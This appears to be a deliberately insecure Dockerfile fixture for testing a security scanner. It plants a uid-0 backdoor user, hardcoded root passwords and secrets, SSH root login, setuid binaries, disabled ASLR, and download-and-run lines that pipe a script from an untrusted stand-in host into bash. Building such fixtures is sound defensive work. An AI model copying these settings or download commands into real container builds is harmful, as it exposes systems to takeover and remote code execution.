# SECURITY TEST FILE - HIGH-RISK VIOLATIONS
# This file contains intentional security violations for testing Security Agent detection

# High-risk violations - should trigger conditional veto
FROM ubuntu:latest

# Running as root (insecure)
USER root

# Installing packages without version pinning
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    ssh \
    telnet \
    ftp \
    && rm -rf /var/lib/apt/lists/*

# Exposing unnecessary ports
EXPOSE 22
EXPOSE 23
EXPOSE 21
EXPOSE 25

# Setting insecure environment variables
ENV DEBUG=true
ENV DISABLE_AUTH=true
ENV ALLOW_EMPTY_PASSWORD=yes
ENV ROOT_PASSWORD=root123

# Adding insecure user
RUN useradd -u 0 -o -g 0 -G 0 -d /root -s /bin/bash insecure_user

# Copying with overly permissive permissions
COPY --chown=root:root --chmod=777 . /app

# Running with privileged mode implied
# --privileged flag would be used in docker run

# Disabling security features
RUN echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
RUN echo "kernel.dmesg_restrict=0" >> /etc/sysctl.conf

# Installing from untrusted sources
RUN curl -sSL https://get.docker.com/ | sh
RUN wget -qO- https://some-untrusted-site.com/install.sh | bash

# Setting up SSH with weak configuration
RUN mkdir -p /var/run/sshd
RUN echo 'root:password' | chpasswd
RUN sed -i 's/PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
RUN sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Creating world-writable directories
RUN mkdir -p /tmp/app && chmod 777 /tmp/app
RUN mkdir -p /var/log/app && chmod 666 /var/log/app/*

# Using ADD instead of COPY for remote URLs
ADD https://example.com/malicious-file.tar.gz /tmp/

# Running unnecessary services
RUN service ssh start
RUN service telnet start

# Hardcoded secrets in Dockerfile
ENV DATABASE_PASSWORD=hardcoded_password
ENV API_KEY=sk-1234567890abcdef
ENV PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAo...\n-----END PRIVATE KEY-----"

# Bind mounting sensitive directories
VOLUME ["/etc", "/var/log", "/root"]

# Running as root at startup
CMD ["su", "-", "root", "-c", "/app/start.sh"]

# Health check that exposes sensitive information
HEALTHCHECK --interval=5m --timeout=3s \
  CMD curl -f http://localhost:8080/health?secret=admin123 || exit 1

# Using latest tag (not specific version)
FROM node:latest AS build

# Installing global packages as root
RUN npm install -g --unsafe-perm=true --allow-root \
    express \
    lodash \
    moment

# Setting up cron jobs as root
RUN echo "0 * * * * root /app/cleanup.sh" >> /etc/crontab

# Creating setuid binaries
RUN chmod +s /usr/bin/find
RUN chmod +s /usr/bin/locate

# Disabling security mechanisms
RUN echo "* soft nofile 65536" >> /etc/security/limits.conf
RUN echo "* hard nofile 65536" >> /etc/security/limits.conf
RUN echo "kernel.randomize_va_space=0" >> /etc/sysctl.conf

# Final stage running as root
FROM ubuntu:latest
USER root
WORKDIR /app
COPY --from=build /app /app
ENTRYPOINT ["/app/run.sh"]